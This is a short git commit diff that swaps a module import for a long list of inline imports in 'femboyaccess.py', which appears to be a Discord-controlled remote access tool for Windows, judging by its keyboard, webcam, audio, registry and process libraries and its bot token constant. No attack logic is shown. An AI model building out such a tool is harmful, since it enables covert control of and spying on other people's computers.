b2aefd1e31ca2dffb0d245561e2d8b9194cab0d8
waw <81994421+ambr0sial@users.noreply.github.com>
2023-12-09 11:56:52 +0100

    modules in src file

--- femboyaccess.py
+++ femboyaccess.py
@@ -1,4 +1,46 @@
-from modules.fem_imports import *
+# from modules.fem_imports import *
+import os
+import discord
+import subprocess
+import requests
+import json
+import pyautogui
+import ctypes
+import sys
+import webbrowser
+import random
+import asyncio
+from playsound import playsound
+import winreg
+import time
+import inspect
+import comtypes
+import win32com.client as wincl
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from pynput.keyboard import Key, Controller
+import re
+import datetime 
+from win32api import *
+import pyaudio
+import psutil
+import winsound
+import win32gui
+import win32process
+from win32ui import *
+from win32con import *
+import aiohttp
+import patoolib
+import shutil
+import cv2
+import pyautogui as auto
+import tkinter
+from PIL import Image, ImageTk, ImageDraw, ImageFont
+from io import BytesIO
+import ipaddress
+import socket
+import numpy
+import imageio
+import nacl
 
 #//  VARIABLES AND CONSTANTS (DO NOT TOUCH ANYTHING EXCEPT GUILD_ID AND TOKEN)  \\#
 version = "(version: 1.7)"
